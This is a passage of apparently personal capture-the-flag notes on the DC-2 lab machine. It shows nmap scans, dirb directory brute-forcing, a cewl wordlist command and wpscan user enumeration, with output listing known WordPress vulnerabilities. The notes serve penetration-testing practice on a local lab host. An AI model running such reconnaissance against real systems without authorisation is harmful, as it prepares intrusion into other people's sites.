<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>DC-2</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="2019.html">2019</a></p>

<ol>
<li><a href="2019--BasicPenTestingBox.html">BasicPenTestingBox</a></li>
<li><a href="2019--BasicPenTestingBox2.html">BasicPenTestingBox2</a></li>
<li><a href="2019--bee_box.html">bee box</a></li>
<li><a href="2019--BossPlayer.html">BossPlayer</a></li>
<li><a href="2019--CyberChallenge19.html">CyberChallenge19</a></li>
<li><a href="2019--Dawn.html">Dawn</a></li>
<li><a href="2019--DC-1.html">DC-1</a></li>
<li><a href="2019--DC-2.html">DC-2</a></li>
<li><a href="2019--DC-3.html">DC-3</a></li>
<li><a href="2019--DerpNStik.html">DerpNStik</a></li>
<li><a href="2019--EVM.html">EVM</a></li>
<li><a href="2019--Fowsniff.html">Fowsniff</a></li>
<li><a href="2019--Gemini_Inc_1.html">Gemini Inc 1</a></li>
<li><a href="2019--JIS_CTF.html">JIS_CTF</a></li>
<li><a href="2019--mullidae.html">mullidae</a></li>
<li><a href="2019--PumpkinFestival.html">PumpkinFestival</a></li>
<li><a href="2019--PumpkinGarden.html">PumpkinGarden</a></li>
<li><a href="2019--PumpkinRaising.html">PumpkinRaising</a></li>
<li><a href="2019--QuaoarCTFHackfest2016.html">QuaoarCTFHackfest2016</a></li>
<li><a href="2019--Rickdiculously_Easy.html">Rickdiculously Easy</a></li>
<li><a href="2019--silky02.html">silky02</a></li>
<li><a href="2019--silky1.html">silky1</a></li>
<li><a href="2019--Typhoon.html">Typhoon</a></li>
<li><a href="2019--VMS_to_try.html">VMS to try</a></li>
<ol>
<li><a href="2019--VMS_to_try--US_Gov_Conf.html">US Gov Conf</a></li>
<li><a href="2019--VMS_to_try--Gruyere.html">Gruyere</a></li>
</ol>
<li><a href="2019--xss_challenges.html">xss challenges</a></li>
<li><a href="2019--Blue.html">Blue</a></li>
<li><a href="2019--mr_robot.html">mr robot</a></li>
<li><a href="2019--Unfinished_VMS.html">Unfinished VMS</a></li>
<ol>
<li><a href="2019--Unfinished_VMS--CasinoRoyale.html">CasinoRoyale</a></li>
<li><a href="2019--Unfinished_VMS--WinterMute_Straylight.html">WinterMute Straylight</a></li>
<li><a href="2019--Unfinished_VMS--connect_the_dots_(unfinished).html">connect the dots (unfinished)</a></li>
<li><a href="2019--Unfinished_VMS--arsenal.html">arsenal</a></li>
<li><a href="2019--Unfinished_VMS--heist.html">heist</a></li>
<li><a href="2019--Unfinished_VMS--MyHouse_Box.html">MyHouse Box</a></li>
<li><a href="2019--Unfinished_VMS--Sputnik.html">Sputnik</a></li>
<li><a href="2019--Unfinished_VMS--Node.html">Node</a></li>
<li><a href="2019--Unfinished_VMS--HackInOs.html">HackInOs</a></li>
<li><a href="2019--Unfinished_VMS--Seattle.html">Seattle</a></li>
<li><a href="2019--Unfinished_VMS--DC416-Galahad.html">DC416-Galahad</a></li>
</ol>
<li><a href="2019--Not_a_Box.html">Not a Box</a></li>
<ol>
<li><a href="2019--Not_a_Box--securitytreasurehunt_web.html">securitytreasurehunt web</a></li>
<li><a href="2019--Not_a_Box--rpc.html">rpc</a></li>
<li><a href="2019--Not_a_Box--msf_fix.html">msf fix</a></li>
</ol>
<li><a href="2019--ICE.html">ICE</a></li>
</ol></div>
<div class="page"><h1><b><u>DC-2</u></b></h1>root@kali:~# nmap -PS 192.168.56.1-255<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-01 21:26 EDT<br />Nmap scan report for 192.168.56.1<br />Host is up (0.0000050s latency).<br />Not shown: 999 closed ports<br />PORT    STATE SERVICE<br />111/tcp open  rpcbind<br /><br />Nmap scan report for 192.168.56.100<br />Host is up (0.000026s latency).<br />All 1000 scanned ports on 192.168.56.100 are filtered<br />MAC Address: 08:00:27:F8:6B:57 (Oracle VirtualBox virtual NIC)<br /><br />Nmap scan report for 192.168.56.107<br />Host is up (0.00012s latency).<br />Not shown: 999 closed ports<br />PORT   STATE SERVICE<br />80/tcp open  http<br />MAC Address: 08:00:27:05:9F:2A (Oracle VirtualBox virtual NIC)<br /><br />Nmap done: 255 IP addresses (3 hosts up) scanned in 4.04 seconds<br />root@kali:~# <br /><br />root@kali:~# nmap -A -p- 192.168.56.107<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-01 21:26 EDT<br />Nmap scan report for 192.168.56.107<br />Host is up (0.00042s latency).<br />Not shown: 65533 closed ports<br />PORT     STATE SERVICE VERSION<br />80/tcp   open  http    Apache httpd 2.4.10 ((Debian))<br />|_http-server-header: Apache/2.4.10 (Debian)<br />|_http-title: Did not follow redirect to <a href="http://dc-2/">http://dc-2/</a><br />|_https-redirect: ERROR: Script execution failed (use -d to debug)<br />7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)<br />| ssh-hostkey: <br />|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)<br />|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)<br />|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)<br />|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)<br />MAC Address: 08:00:27:05:9F:2A (Oracle VirtualBox virtual NIC)<br />Device type: general purpose<br />Running: Linux 3.X|4.X<br />OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br />OS details: Linux 3.2 - 4.9<br />Network Distance: 1 hop<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE<br />HOP RTT     ADDRESS<br />1   0.42 ms 192.168.56.107<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 15.42 seconds<br />root@kali:~# <br /><br /><img src="images/16-1.png" alt="images/16-1.png" /><br /><br /><img src="images/16-2.png" alt="images/16-2.png" /><br /><br /><img src="images/16-3.png" alt="images/16-3.png" /><br /><br /><br />root@kali:~# dirb <a href="http://192.168.56.107">http://192.168.56.107</a> /usr/share/wordlists/dirb/common.txt<br /><br />-----------------<br />DIRB v2.22    <br />By The Dark Raver<br />-----------------<br /><br />START_TIME: Fri Nov  1 21:43:23 2019<br />URL_BASE: <a href="http://192.168.56.107/">http://192.168.56.107/</a><br />WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt<br /><br />-----------------<br /><br />GENERATED WORDS: 4612                                                          <br /><br />---- Scanning URL: <a href="http://192.168.56.107/">http://192.168.56.107/</a> ----<br />+ <a href="http://192.168.56.107/index.php">http://192.168.56.107/index.php</a> (CODE:200|SIZE:53562)                        <br />+ <a href="http://192.168.56.107/server-status">http://192.168.56.107/server-status</a> (CODE:403|SIZE:302)                      <br />==&gt; DIRECTORY: <a href="http://192.168.56.107/wp-admin/">http://192.168.56.107/wp-admin/</a>                                 <br />==&gt; DIRECTORY: <a href="http://192.168.56.107/wp-content/">http://192.168.56.107/wp-content/</a>                               <br />==&gt; DIRECTORY: <a href="http://192.168.56.107/wp-includes/">http://192.168.56.107/wp-includes/</a>                              <br />+ <a href="http://192.168.56.107/xmlrpc.php">http://192.168.56.107/xmlrpc.php</a> (CODE:405|SIZE:42)                          <br />                                                                               <br />---- Entering directory: <a href="http://192.168.56.107/wp-admin/">http://192.168.56.107/wp-admin/</a> ----<br />+ <a href="http://192.168.56.107/wp-admin/admin.php">http://192.168.56.107/wp-admin/admin.php</a> (CODE:302|SIZE:0)                   <br />==&gt; DIRECTORY: <a href="http://192.168.56.107/wp-admin/css/">http://192.168.56.107/wp-admin/css/</a>                             <br />==&gt; DIRECTORY: <a href="http://192.168.56.107/wp-admin/images/">http://192.168.56.107/wp-admin/images/</a>                          <br />==&gt; DIRECTORY: <a href="http://192.168.56.107/wp-admin/includes/">http://192.168.56.107/wp-admin/includes/</a>                        <br />+ <a href="http://192.168.56.107/wp-admin/index.php">http://192.168.56.107/wp-admin/index.php</a> (CODE:302|SIZE:0)                   <br />==&gt; DIRECTORY: <a href="http://192.168.56.107/wp-admin/js/">http://192.168.56.107/wp-admin/js/</a>                              <br />==&gt; DIRECTORY: <a href="http://192.168.56.107/wp-admin/maint/">http://192.168.56.107/wp-admin/maint/</a>                           <br />==&gt; DIRECTORY: <a href="http://192.168.56.107/wp-admin/network/">http://192.168.56.107/wp-admin/network/</a>                         <br />==&gt; DIRECTORY: <a href="http://192.168.56.107/wp-admin/user/">http://192.168.56.107/wp-admin/user/</a>                            <br />                                                                               <br />---- Entering directory: <a href="http://192.168.56.107/wp-content/">http://192.168.56.107/wp-content/</a> ----<br />+ <a href="http://192.168.56.107/wp-content/index.php">http://192.168.56.107/wp-content/index.php</a> (CODE:200|SIZE:0)                 <br />==&gt; DIRECTORY: <a href="http://192.168.56.107/wp-content/languages/">http://192.168.56.107/wp-content/languages/</a>                     <br />==&gt; DIRECTORY: <a href="http://192.168.56.107/wp-content/plugins/">http://192.168.56.107/wp-content/plugins/</a>                       <br />==&gt; DIRECTORY: <a href="http://192.168.56.107/wp-content/themes/">http://192.168.56.107/wp-content/themes/</a>                        <br />                                                                               <br />---- Entering directory: <a href="http://192.168.56.107/wp-includes/">http://192.168.56.107/wp-includes/</a> ----<br />(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br />    (Use mode '-w' if you want to scan it anyway)<br />                                                                               <br />---- Entering directory: <a href="http://192.168.56.107/wp-admin/css/">http://192.168.56.107/wp-admin/css/</a> ----<br />(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br />    (Use mode '-w' if you want to scan it anyway)<br />                                                                               <br />---- Entering directory: <a href="http://192.168.56.107/wp-admin/images/">http://192.168.56.107/wp-admin/images/</a> ----<br />(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br />    (Use mode '-w' if you want to scan it anyway)<br />                                                                               <br />---- Entering directory: <a href="http://192.168.56.107/wp-admin/includes/">http://192.168.56.107/wp-admin/includes/</a> ----<br />(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br />    (Use mode '-w' if you want to scan it anyway)<br />                                                                               <br />---- Entering directory: <a href="http://192.168.56.107/wp-admin/js/">http://192.168.56.107/wp-admin/js/</a> ----<br />(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br />    (Use mode '-w' if you want to scan it anyway)<br />                                                                               <br />---- Entering directory: <a href="http://192.168.56.107/wp-admin/maint/">http://192.168.56.107/wp-admin/maint/</a> ----<br />(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br />    (Use mode '-w' if you want to scan it anyway)<br />                                                                               <br />---- Entering directory: <a href="http://192.168.56.107/wp-admin/network/">http://192.168.56.107/wp-admin/network/</a> ----<br />+ <a href="http://192.168.56.107/wp-admin/network/admin.php">http://192.168.56.107/wp-admin/network/admin.php</a> (CODE:302|SIZE:0)           <br />+ <a href="http://192.168.56.107/wp-admin/network/index.php">http://192.168.56.107/wp-admin/network/index.php</a> (CODE:302|SIZE:0)           <br />                                                                               <br />---- Entering directory: <a href="http://192.168.56.107/wp-admin/user/">http://192.168.56.107/wp-admin/user/</a> ----<br />+ <a href="http://192.168.56.107/wp-admin/user/admin.php">http://192.168.56.107/wp-admin/user/admin.php</a> (CODE:302|SIZE:0)              <br />+ <a href="http://192.168.56.107/wp-admin/user/index.php">http://192.168.56.107/wp-admin/user/index.php</a> (CODE:302|SIZE:0)              <br />                                                                               <br />---- Entering directory: <a href="http://192.168.56.107/wp-content/languages/">http://192.168.56.107/wp-content/languages/</a> ----<br />(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br />    (Use mode '-w' if you want to scan it anyway)<br />                                                                               <br />---- Entering directory: <a href="http://192.168.56.107/wp-content/plugins/">http://192.168.56.107/wp-content/plugins/</a> ----<br />+ <a href="http://192.168.56.107/wp-content/plugins/index.php">http://192.168.56.107/wp-content/plugins/index.php</a> (CODE:200|SIZE:0)         <br />                                                                               <br />---- Entering directory: <a href="http://192.168.56.107/wp-content/themes/">http://192.168.56.107/wp-content/themes/</a> ----<br />+ <a href="http://192.168.56.107/wp-content/themes/index.php">http://192.168.56.107/wp-content/themes/index.php</a> (CODE:200|SIZE:0)          <br />                                                                               <br />-----------------<br />END_TIME: Fri Nov  1 21:43:31 2019<br />DOWNLOADED: 32284 - FOUND: 12<br />root@kali:~# <br /><br /><img src="images/16-4.png" alt="images/16-4.png" /><br /><br /><br />----&gt; In the flag it says to use cewl:<br />-------→ which is tool that makes a wordlist from website<br /><br />cewl <a href="http://dc-2/">http://dc-2/</a> -w dc2_cewl.txt<br /><br />----&gt; Use wpscan to enumerate users on the site, and scan for vulnerabilities:<br /><br />wpscan --url <a href="http://dc-2/">http://dc-2/</a> --enumerate u<br /><br />root@kali:~# wpscan --url <a href="http://dc-2/">http://dc-2/</a> --enumerate u<br />_______________________________________________________________<br />        __          _______   _____<br />        \ \        / /  __ \ / ____|<br />         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br />          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \<br />           \  /\  /  | |     ____) | (__| (_| | | | |<br />            \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br /><br />        WordPress Security Scanner by the WPScan Team<br />                       Version 3.6.3<br />          Sponsored by Sucuri - <a href="https://sucuri.net">https://sucuri.net</a><br />      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_<br />_______________________________________________________________<br /><br />[i] Updating the Database ...<br />[i] Update completed.<br /><br />[+] URL: <a href="http://dc-2/">http://dc-2/</a><br />[+] Started: Fri Nov  1 21:54:35 2019<br /><br />Interesting Finding(s):<br /><br />[+] <a href="http://dc-2/">http://dc-2/</a><br /> | Interesting Entry: Server: Apache/2.4.10 (Debian)<br /> | Found By: Headers (Passive Detection)<br /> | Confidence: 100%<br /><br />[+] <a href="http://dc-2/xmlrpc.php">http://dc-2/xmlrpc.php</a><br /> | Found By: Direct Access (Aggressive Detection)<br /> | Confidence: 100%<br /> | References:<br /> |  - <a href="http://codex.wordpress.org/XML-RPC_Pingback_API">http://codex.wordpress.org/XML-RPC_Pingback_API</a><br /> |  - <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner">https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</a><br /> |  - <a href="https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos">https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</a><br /> |  - <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login">https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</a><br /> |  - <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access">https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</a><br /><br />[+] <a href="http://dc-2/readme.html">http://dc-2/readme.html</a><br /> | Found By: Direct Access (Aggressive Detection)<br /> | Confidence: 100%<br /><br />[+] <a href="http://dc-2/wp-cron.php">http://dc-2/wp-cron.php</a><br /> | Found By: Direct Access (Aggressive Detection)<br /> | Confidence: 60%<br /> | References:<br /> |  - <a href="https://www.iplocation.net/defend-wordpress-from-ddos">https://www.iplocation.net/defend-wordpress-from-ddos</a><br /> |  - <a href="https://github.com/wpscanteam/wpscan/issues/1299">https://github.com/wpscanteam/wpscan/issues/1299</a><br /><br />[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).<br /> | Detected By: Rss Generator (Passive Detection)<br /> |  - <a href="http://dc-2/index.php/feed/,">http://dc-2/index.php/feed/,</a> &lt;generator&gt;<a href="https://wordpress.org/?v=4.7.10</generator>">https://wordpress.org/?v=4.7.10&lt;/generator&gt;</a><br /> |  - <a href="http://dc-2/index.php/comments/feed/,">http://dc-2/index.php/comments/feed/,</a> &lt;generator&gt;<a href="https://wordpress.org/?v=4.7.10</generator>">https://wordpress.org/?v=4.7.10&lt;/generator&gt;</a><br /> |<br /> | [!] 17 vulnerabilities identified:<br /> |<br /> | [!] Title: WordPress &lt;= 4.9.6 - Authenticated Arbitrary File Deletion<br /> |     Fixed in: 4.7.11<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9100">https://wpvulndb.com/vulnerabilities/9100</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895</a><br /> |      - <a href="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/">https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/</a><br /> |      - <a href="http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/">http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/</a><br /> |      - <a href="https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd">https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd</a><br /> |      - <a href="https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/">https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/</a><br /> |      - <a href="https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/">https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/</a><br /> |<br /> | [!] Title: WordPress &lt;= 5.0 - Authenticated File Delete<br /> |     Fixed in: 4.7.12<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9169">https://wpvulndb.com/vulnerabilities/9169</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147</a><br /> |      - <a href="https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/">https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</a><br /> |<br /> | [!] Title: WordPress &lt;= 5.0 - Authenticated Post Type Bypass<br /> |     Fixed in: 4.7.12<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9170">https://wpvulndb.com/vulnerabilities/9170</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152</a><br /> |      - <a href="https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/">https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</a><br /> |      - <a href="https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/">https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/</a><br /> |<br /> | [!] Title: WordPress &lt;= 5.0 - PHP Object Injection via Meta Data<br /> |     Fixed in: 4.7.12<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9171">https://wpvulndb.com/vulnerabilities/9171</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148</a><br /> |      - <a href="https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/">https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</a><br /> |<br /> | [!] Title: WordPress &lt;= 5.0 - Authenticated Cross-Site Scripting (XSS)<br /> |     Fixed in: 4.7.12<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9172">https://wpvulndb.com/vulnerabilities/9172</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153</a><br /> |      - <a href="https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/">https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</a><br /> |<br /> | [!] Title: WordPress &lt;= 5.0 - Cross-Site Scripting (XSS) that could affect plugins<br /> |     Fixed in: 4.7.12<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9173">https://wpvulndb.com/vulnerabilities/9173</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150</a><br /> |      - <a href="https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/">https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</a><br /> |      - <a href="https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460">https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460</a><br /> |<br /> | [!] Title: WordPress &lt;= 5.0 - User Activation Screen Search Engine Indexing<br /> |     Fixed in: 4.7.12<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9174">https://wpvulndb.com/vulnerabilities/9174</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151</a><br /> |      - <a href="https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/">https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</a><br /> |<br /> | [!] Title: WordPress &lt;= 5.0 - File Upload to XSS on Apache Web Servers<br /> |     Fixed in: 4.7.12<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9175">https://wpvulndb.com/vulnerabilities/9175</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149</a><br /> |      - <a href="https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/">https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</a><br /> |      - <a href="https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a">https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a</a><br /> |<br /> | [!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution<br /> |     Fixed in: 5.0.1<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9222">https://wpvulndb.com/vulnerabilities/9222</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943</a><br /> |      - <a href="https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/">https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/</a><br /> |      - <a href="https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce">https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce</a><br /> |<br /> | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)<br /> |     Fixed in: 4.7.13<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9230">https://wpvulndb.com/vulnerabilities/9230</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787</a><br /> |      - <a href="https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b">https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b</a><br /> |      - <a href="https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/">https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/</a><br /> |      - <a href="https://blog.ripstech.com/2019/wordpress-csrf-to-rce/">https://blog.ripstech.com/2019/wordpress-csrf-to-rce/</a><br /> |<br /> | [!] Title: WordPress &lt;= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation<br /> |     Fixed in: 4.7.14<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9867">https://wpvulndb.com/vulnerabilities/9867</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222</a><br /> |      - <a href="https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/">https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/</a><br /> |      - <a href="https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68">https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68</a><br /> |<br /> | [!] Title: WordPress &lt;= 5.2.3 - Stored XSS in Customizer<br /> |     Fixed in: 4.7.15<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9908">https://wpvulndb.com/vulnerabilities/9908</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674</a><br /> |      - <a href="https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/">https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/</a><br /> |      - <a href="https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html">https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html</a><br /> |<br /> | [!] Title: WordPress &lt;= 5.2.3 - Unauthenticated View Private/Draft Posts<br /> |     Fixed in: 4.7.15<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9909">https://wpvulndb.com/vulnerabilities/9909</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671</a><br /> |      - <a href="https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/">https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/</a><br /> |      - <a href="https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html">https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html</a><br /> |      - <a href="https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308">https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308</a><br /> |      - <a href="https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/">https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/</a><br /> |<br /> | [!] Title: WordPress &lt;= 5.2.3 - Stored XSS in Style Tags<br /> |     Fixed in: 4.7.15<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9910">https://wpvulndb.com/vulnerabilities/9910</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17672">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17672</a><br /> |      - <a href="https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/">https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/</a><br /> |      - <a href="https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html">https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html</a><br /> |<br /> | [!] Title: WordPress &lt;= 5.2.3 - JSON Request Cache Poisoning<br /> |     Fixed in: 4.7.15<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9911">https://wpvulndb.com/vulnerabilities/9911</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17673">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17673</a><br /> |      - <a href="https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/">https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/</a><br /> |      - <a href="https://github.com/WordPress/WordPress/commit/b224c251adfa16a5f84074a3c0886270c9df38de">https://github.com/WordPress/WordPress/commit/b224c251adfa16a5f84074a3c0886270c9df38de</a><br /> |      - <a href="https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html">https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html</a><br /> |<br /> | [!] Title: WordPress &lt;= 5.2.3 - Server-Side Request Forgery (SSRF) in URL Validation <br /> |     Fixed in: 4.7.15<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9912">https://wpvulndb.com/vulnerabilities/9912</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17669">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17669</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17670">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17670</a><br /> |      - <a href="https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/">https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/</a><br /> |      - <a 